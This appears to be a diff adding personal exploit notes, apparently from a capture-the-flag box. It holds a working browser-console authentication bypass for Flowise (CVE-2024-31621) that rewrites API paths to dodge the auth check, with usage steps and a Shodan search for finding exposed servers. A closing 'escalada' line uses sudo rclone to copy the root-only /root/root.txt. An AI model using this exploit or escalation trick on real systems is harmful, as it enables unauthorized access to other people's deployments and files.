@@ -1,0 +1,19 @@
+/*  CVE-2024-31621
+    Flowise 1.6.5 <= Authentication Bypass
+    By komodo
+    Usage:  Navigate to a page that does not require auth (ex: /tools),
+            then inject this code inside dev tools console.
+    
+    Shodan dork: http.favicon.hash:-2051052918
+*/
+var req = XMLHttpRequest.prototype.open;
+XMLHttpRequest.prototype.open = function(method, url) {
+    arguments[1] = url.replace('/api/v1/','/API/V1/');
+    return req.apply(this, arguments);
+};
+
+URL: https://gist.github.com/komodoooo/3666c2a3dc8db566d439f7a936c90ea7
+
+escalada
+
+sudo rclone copy /root/root.txt .
